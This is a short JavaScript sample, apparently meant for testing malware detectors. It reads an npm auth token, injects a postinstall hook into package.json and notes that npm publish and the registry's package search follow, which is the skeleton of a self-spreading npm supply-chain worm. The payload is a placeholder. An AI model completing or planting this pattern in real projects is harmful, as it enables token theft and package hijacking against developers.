// Placeholder sample for detection testing only.
const fs = require('fs');
const token = process.env.NPM_TOKEN; // _authToken read from .npmrc
const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
pkg.scripts = { ...pkg.scripts, "postinstall": "node placeholder.js" };
fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
// npm publish is invoked afterwards; registry.npmjs.org/-/v1/search lists packages
